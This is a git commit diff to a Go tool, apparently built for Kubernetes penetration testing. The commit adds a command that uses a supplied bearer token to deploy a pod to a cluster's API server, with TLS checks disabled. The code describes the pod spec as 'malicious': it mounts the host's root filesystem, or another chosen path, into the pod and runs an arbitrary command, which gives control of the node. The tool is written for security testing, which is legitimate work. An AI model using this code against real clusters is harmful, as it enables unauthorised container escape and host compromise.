1e831ee276d841715dff7356d4d3ba099ea2df22
cory <cory@secureideas.com>
2019-10-19 20:48:26 +0000

    added janky command to deply a pod via the k8s api

--- enum4k8s.go
+++ enum4k8s.go
@@ -4,6 +4,7 @@ import (
   //"bytes"
   "encoding/json"
   "fmt"
+  "io"
   "io/ioutil"
   "net/http"
   "flag"
@@ -11,6 +12,30 @@ import (
   "strconv"
   "strings"
 )
+
+/*
+A thin HTTP request wrapper
+*/
+func doReq(method string, url string, headers *map[string]string, body io.Reader) (*http.Response, error) {
+  client := &http.Client{}
+  req, err := http.NewRequest("POST", url, body)
+  if err != nil {
+    return nil, err
+  }
+
+  for k, v := range *headers {
+    req.Header.Add(k, v)
+  }
+
+  res, err := client.Do(req)
+  if err != nil {
+    return nil, err
+  }
+  resBody, _ := ioutil.ReadAll(res.Body)
+  fmt.Println(string(resBody))
+  defer res.Body.Close()
+  return res, err
+}
 
 func get(url string, headers *map[string]string) (*http.Response, error) {
   client := &http.Client{}
@@ -91,35 +116,8 @@ func getPaths(
   return statuses, nil
 }
 
-func main() {
-  // Disable SSL security checks
-  http.DefaultTransport.
-    (*http.Transport).
-    TLSClientConfig = &tls.Config{
-      InsecureSkipVerify: true,
-    }
-
-  urlPtr := flag.String("url", "https://kubernetes.default.svc", "the url of the k8s api server")
-  jwtPtr := flag.String("jwt", "", "the token to use for authorization")
-  nsPtr := flag.String("ns", "default", "the namespace to try and enumerate")
-  dumpPtr := flag.Bool("dump", false, "Dump all the information possible")
-  podPtr := flag.Bool("pod", false, "Generate a malicious pod spec in JSON format")
-  namePtr := flag.String("name", "", "The name for for the pod spec")
-  cmdPtr := flag.String("cmd", "", "The command string for the pod spec")
-  imagePtr := flag.String("img", "", "The image for the pod spec")
-  flag.Parse()
-
-  if *podPtr == true {
-    podName := *namePtr
-    podCmdStr := *cmdPtr
-    podImage := *imagePtr
-
-    errMsg := "\n[!] -name, -cmd, -img required when using -pod"
-    if podName == "" || podCmdStr == "" || podImage == "" {
-      panic(errMsg)
-    }
-
-    podStr := `{
+func podSpec(name string, image string, cmd string, bindPath string) string {
+  podStr := `{
   "apiVersion":"v1",
   "kind":"Pod",
   "metadata":{"name":"%s"},
@@ -140,12 +138,73 @@ func main() {
     "volumes":[{
       "name":"hostvolume",
       "hostPath":{
-  	    "path":"/"
+  	    "path":"%s"
       }
     }]
   }
 }`
-    fmt.Printf(podStr, podName, podName, podImage, podCmdStr)
+  return fmt.Sprintf(podStr, name, name, image, cmd, bindPath)
+}
+
+func main() {
+  // Disable SSL security checks
+  http.DefaultTransport.
+    (*http.Transport).
+    TLSClientConfig = &tls.Config{
+      InsecureSkipVerify: true,
+    }
+
+  urlPtr := flag.String("url", "https://kubernetes.default.svc", "the url of the k8s api server")
+  jwtPtr := flag.String("jwt", "", "the token to use for authorization")
+  nsPtr := flag.String("ns", "default", "the namespace to try and enumerate")
+  dumpPtr := flag.Bool("dump", false, "Dump all the information possible")
+  podPtr := flag.Bool("pod", false, "Generate a malicious pod spec in JSON format")
+  namePtr := flag.String("name", "", "The name for for the pod spec")
+  cmdPtr := flag.String("cmd", "", "The command string for the pod spec")
+  imagePtr := flag.String("img", "", "The image for the pod spec")
+  deployPtr := flag.Bool("deploy", false, "Attempt to deploy a pod using the k8s api")
+  bindPtr := flag.String("bind", "/", "Host dir to bind mount to pod; Default value of /")
+  flag.Parse()
+
+  if *podPtr == true {
+    podName := *namePtr
+    podCmdStr := *cmdPtr
+    podImage := *imagePtr
+    bindPath := *bindPtr
+
+    errMsg := "\n[!] -name, -cmd, -img required when using -pod"
+    if podName == "" || podCmdStr == "" || podImage == "" {
+      panic(errMsg)
+    }
+
+    podStr := podSpec(podName, podImage, podCmdStr, bindPath)
+    fmt.Println(podStr)
+    return
+  }
+
+  if *deployPtr == true {
+    podName := *namePtr
+    podCmdStr := *cmdPtr
+    podImage := *imagePtr
+    bindPath := *bindPtr
+    ns := *nsPtr
+
+    // construct the headers map
+    headers := map[string]string{
+      "Accept": "application/json",
+      "Content-Type": "application/json",
+    }
+    if *jwtPtr != "" {
+      *jwtPtr = strings.ReplaceAll(*jwtPtr, "\"", "")
+      headers["Authorization"] = "Bearer " + *jwtPtr
+    }
+
+    body := podSpec(podName, podImage, podCmdStr, bindPath)
+    res, err := doReq("POST", *urlPtr + "/api/v1/namespaces/" + ns + "/pods", &headers, strings.NewReader(body))
+    if err != nil {
+      panic(err)
+    }
+    fmt.Println(res)
     return
   }
 
@@ -193,7 +252,7 @@ func main() {
       // set the namespace in each path where {namespace} is present
       // Ideally we should extract the namespace from the token if it is supplied
       // We can add this later.
-      for k, _ := range pathsMap {
+      for k := range pathsMap {
         // replace {namespace} with -ns value
         // TODO retool this to go into a slice!
         pathsSlice = append(pathsSlice, strings.Replace(k, "{namespace}", *nsPtr, 1))
